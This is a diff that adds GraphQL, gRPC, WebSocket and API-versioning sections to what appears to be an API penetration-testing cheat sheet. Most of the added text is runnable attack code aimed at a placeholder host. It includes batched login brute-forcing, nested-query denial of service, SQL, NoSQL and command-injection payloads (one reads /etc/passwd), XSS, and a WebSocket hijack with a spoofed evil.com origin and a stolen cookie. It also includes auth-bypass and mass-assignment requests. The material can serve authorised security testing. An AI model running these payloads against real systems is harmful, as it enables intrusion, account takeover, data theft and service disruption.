@@ -390,3 +390,361 @@ curl -s -X POST https://target.com/api/v1/users -d 'invalid'  # Format error
 curl -s https://target.com/api/v1/users/999999999    # Out-of-range ID
 curl -s -H "Authorization: Bearer invalid" https://target.com/api/v1/users
 ```
+
+---
+
+## 9. GraphQL Exploitation
+
+### Full Introspection with Field Arguments
+
+```bash
+# Complete introspection query extracting types, fields, arguments, and mutations
+curl -s -X POST https://target.com/graphql \
+     -H "Content-Type: application/json" \
+     -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind ofType { name } } } type { name kind ofType { name } } } } } }"}' | jq '.data.__schema.types[] | select(.kind == "OBJECT") | {name, fields: [.fields[].name]}'
+
+# Extract all mutations with their arguments
+curl -s -X POST https://target.com/graphql \
+     -H "Content-Type: application/json" \
+     -d '{"query":"{ __schema { mutationType { fields { name args { name type { name kind ofType { name } } } } } } }"}' | jq '.data.__schema.mutationType.fields[]'
+```
+
+### GraphQL Batching Attack (Rate Limit Bypass)
+
+```bash
+# Batch 100 login attempts in a single HTTP request
+python3 -c "
+import json
+queries = []
+for i in range(100):
+    queries.append({
+        'query': f'mutation {{ login(email: \"admin@target.com\", password: \"pass{i}\") {{ token }} }}',
+        'operationName': None
+    })
+print(json.dumps(queries))
+" | curl -s -X POST https://target.com/graphql \
+     -H "Content-Type: application/json" \
+     -d @- | jq '.[] | select(.data.login.token != null)'
+```
+
+### Nested Query DoS (Resource Exhaustion)
+
+```bash
+# Generate deeply nested query to test depth limits
+python3 -c "
+depth = 20
+query = 'query { '
+for i in range(depth):
+    query += 'users { posts { comments { author { '
+query += 'id name email '
+query += '} ' * (depth * 4)
+query += '}'
+print(query)
+" | curl -s -X POST https://target.com/graphql \
+     -H "Content-Type: application/json" \
+     -d "{\"query\": \"$(cat)\"}" -w "\n%{time_total}s\n"
+
+# Alias-based query multiplication (bypass query cost analysis)
+curl -s -X POST https://target.com/graphql \
+     -H "Content-Type: application/json" \
+     -d '{"query":"{ a1:user(id:1){email} a2:user(id:2){email} a3:user(id:3){email} a4:user(id:4){email} a5:user(id:5){email} a6:user(id:6){email} a7:user(id:7){email} a8:user(id:8){email} a9:user(id:9){email} a10:user(id:10){email} }"}'
+```
+
+### GraphQL Injection via Variables
+
+```bash
+# SQL injection through GraphQL variables
+curl -s -X POST https://target.com/graphql \
+     -H "Content-Type: application/json" \
+     -d '{"query":"query getUser($id: String!) { user(id: $id) { name email } }","variables":{"id":"1 OR 1=1--"}}'
+
+# NoSQL injection through variables
+curl -s -X POST https://target.com/graphql \
+     -H "Content-Type: application/json" \
+     -d '{"query":"query getUser($filter: JSON) { users(filter: $filter) { name email } }","variables":{"filter":{"$gt":""}}}'
+```
+
+### GraphQL Subscription Abuse
+
+```bash
+# Test WebSocket-based GraphQL subscriptions for auth bypass
+python3 -c "
+import websocket
+import json
+
+ws = websocket.create_connection('wss://target.com/graphql', subprotocols=['graphql-ws'])
+# Init connection without auth
+ws.send(json.dumps({'type': 'connection_init', 'payload': {}}))
+print(ws.recv())
+
+# Subscribe to sensitive data stream
+ws.send(json.dumps({
+    'id': '1',
+    'type': 'start',
+    'payload': {'query': 'subscription { newOrder { id amount customerEmail } }'}
+}))
+print(ws.recv())
+ws.close()
+"
+```
+
+---
+
+## 10. gRPC Security Testing
+
+### gRPC Service Reflection Enumeration
+
+```bash
+# List all available gRPC services via reflection
+grpcurl -plaintext target.com:50051 list
+
+# Describe a specific service (get method signatures)
+grpcurl -plaintext target.com:50051 describe UserService
+
+# Describe a specific message type
+grpcurl -plaintext target.com:50051 describe .user.UserRequest
+
+# List methods of a service
+grpcurl -plaintext target.com:50051 list UserService
+```
+
+### gRPC Method Invocation Without Auth
+
+```bash
+# Call gRPC method without authentication
+grpcurl -plaintext -d '{"user_id": "admin"}' \
+  target.com:50051 UserService/GetUser
+
+# Call with manipulated metadata (auth bypass attempt)
+grpcurl -plaintext \
+  -H "authorization: Bearer invalid_token" \
+  -H "x-user-role: admin" \
+  -d '{"user_id": "1"}' \
+  target.com:50051 UserService/GetUser
+
+# Enumerate user IDs via gRPC
+for i in $(seq 1 100); do
+  result=$(grpcurl -plaintext -d "{\"user_id\": \"$i\"}" \
+    target.com:50051 UserService/GetUser 2>&1)
+  echo "$result" | grep -q "email" && echo "[+] User $i: $result"
+done
+```
+
+### gRPC Message Manipulation
+
+```bash
+# Send malformed protobuf messages to trigger errors
+grpcurl -plaintext -d '{"user_id": "1\x00admin"}' \
+  target.com:50051 UserService/GetUser
+
+# Integer overflow in protobuf fields
+grpcurl -plaintext -d '{"amount": 9999999999999999999}' \
+  target.com:50051 PaymentService/ProcessPayment
+
+# Test field type confusion
+grpcurl -plaintext -d '{"user_id": "-1", "role": "ADMIN"}' \
+  target.com:50051 UserService/UpdateUser
+```
+
+### gRPC-Web Proxy Testing
+
+```bash
+# Test gRPC-Web endpoints (HTTP/1.1 compatible)
+curl -s -X POST https://target.com/grpc-web/UserService/GetUser \
+     -H "Content-Type: application/grpc-web+proto" \
+     -H "X-Grpc-Web: 1" \
+     --data-binary @request.bin
+
+# Decode gRPC-Web response
+curl -s -X POST https://target.com/grpc-web/UserService/ListUsers \
+     -H "Content-Type: application/grpc-web-text" \
+     -H "X-Grpc-Web: 1" \
+     -d "AAAAAAA=" | base64 -d | protoc --decode_raw
+```
+
+---
+
+## 11. WebSocket API Attacks
+
+### WebSocket Connection Hijacking
+
+```bash
+# Test WebSocket without Origin validation
+python3 -c "
+import websocket
+import json
+
+# Connect with spoofed Origin header
+ws = websocket.create_connection(
+    'wss://target.com/ws/chat',
+    origin='https://evil.com',
+    header=['Cookie: session=stolen_session_id']
+)
+ws.send(json.dumps({'type': 'get_messages', 'channel': 'admin'}))
+print(ws.recv())
+ws.close()
+"
+```
+
+### WebSocket Injection Attacks
+
+```bash
+# XSS via WebSocket message
+python3 -c "
+import websocket, json
+ws = websocket.create_connection('wss://target.com/ws/chat')
+ws.send(json.dumps({
+    'type': 'message',
+    'content': '<img src=x onerror=alert(document.cookie)>',
+    'channel': 'general'
+}))
+print(ws.recv())
+
+# SQL injection via WebSocket
+ws.send(json.dumps({
+    'type': 'search',
+    'query': \"' OR '1'='1' --\"
+}))
+print(ws.recv())
+
+# Command injection via WebSocket
+ws.send(json.dumps({
+    'type': 'ping',
+    'host': '127.0.0.1; cat /etc/passwd'
+}))
+print(ws.recv())
+ws.close()
+"
+```
+
+### WebSocket Authentication Bypass
+
+```bash
+# Test if WebSocket upgrades bypass REST API authentication
+# Step 1: Establish connection without auth token
+python3 -c "
+import websocket, json, ssl
+
+ws = websocket.create_connection(
+    'wss://target.com/ws/api',
+    sslopt={'cert_reqs': ssl.CERT_NONE}
+)
+# Attempt to access authenticated endpoints via WS
+ws.send(json.dumps({'action': 'getUsers', 'params': {}}))
+response = json.loads(ws.recv())
+if 'users' in response:
+    print('[+] WebSocket auth bypass: accessed user data without token')
+    print(json.dumps(response, indent=2))
+else:
+    print('[-] Authentication enforced on WebSocket')
+ws.close()
+"
+```
+
+### WebSocket Rate Limit Testing
+
+```bash
+# Flood WebSocket with rapid messages to test rate limiting
+python3 -c "
+import websocket, json, time
+
+ws = websocket.create_connection('wss://target.com/ws/api')
+success = 0
+blocked = 0
+for i in range(1000):
+    try:
+        ws.send(json.dumps({'action': 'login', 'user': 'admin', 'pass': f'pass{i}'}))
+        resp = ws.recv()
+        if 'rate' in resp.lower() or 'limit' in resp.lower():
+            blocked += 1
+            break
+        success += 1
+    except Exception as e:
+        print(f'Connection closed after {success} attempts: {e}')
+        break
+print(f'Sent: {success + blocked}, Blocked at: {success}')
+ws.close()
+"
+```
+
+---
+
+## 12. API Versioning Exploits
+
+### Deprecated Endpoint Discovery
+
+```bash
+# Enumerate API versions to find deprecated/unpatched endpoints
+for version in v1 v2 v3 v4 v5 beta alpha internal legacy; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" \
+    -H "Authorization: Bearer TOKEN" \
+    "https://target.com/api/$version/users")
+  [ "$code" != "404" ] && echo "[+] /$version/users -> HTTP $code"
+done
+
+# Check version via Accept header
+for version in 1 2 3; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" \
+    -H "Accept: application/vnd.api.v${version}+json" \
+    -H "Authorization: Bearer TOKEN" \
+    "https://target.com/api/users")
+  [ "$code" != "404" ] && echo "[+] Accept v${version} -> HTTP $code"
+done
+```
+
+### Version Rollback Attack
+
+```bash
+# v2 has input validation, v1 may not
+# Test SQL injection on old version
+curl -s "https://target.com/api/v1/users?search=admin' OR '1'='1" \
+     -H "Authorization: Bearer TOKEN"
+
+# Test mass assignment on old version (v1 may lack field filtering)
+curl -s -X PUT "https://target.com/api/v1/users/123" \
+     -H "Authorization: Bearer TOKEN" \
+     -H "Content-Type: application/json" \
+     -d '{"name":"test","role":"admin","is_superuser":true}'
+
+# Test BOLA on old version (v1 may lack authorization checks)
+curl -s "https://target.com/api/v1/admin/users" \
+     -H "Authorization: Bearer REGULAR_USER_TOKEN"
+```
+
+### API Version Header Manipulation
+
+```bash
+# Override API version via custom headers
+curl -s "https://target.com/api/users" \
+     -H "Authorization: Bearer TOKEN" \
+     -H "X-API-Version: 1" \
+     -H "Api-Version: 2020-01-01"
+
+# Test version negotiation bypass
+curl -s "https://target.com/api/users" \
+     -H "Authorization: Bearer TOKEN" \
+     -H "Accept: application/json; version=1"
+
+# GraphQL version bypass via persisted queries
+curl -s -X POST "https://target.com/graphql" \
+     -H "Content-Type: application/json" \
+     -d '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"old_deprecated_query_hash"}}}'
+```
+
+### Sunset Header and Deprecation Abuse
+
+```bash
+# Find endpoints with Sunset/Deprecation headers (still functional but unmonitored)
+for endpoint in users orders payments admin config settings; do
+  headers=$(curl -sI "https://target.com/api/v1/$endpoint" \
+    -H "Authorization: Bearer TOKEN")
+  sunset=$(echo "$headers" | grep -i "sunset\|deprecat")
+  if [ -n "$sunset" ]; then
+    echo "[DEPRECATED] /api/v1/$endpoint"
+    echo "  $sunset"
+    # Test if deprecated endpoint has weaker security
+    curl -s "https://target.com/api/v1/$endpoint" \
+      -H "Authorization: Bearer EXPIRED_TOKEN" -o /dev/null -w "  Status: %{http_code}\n"
+  fi
+done
+```
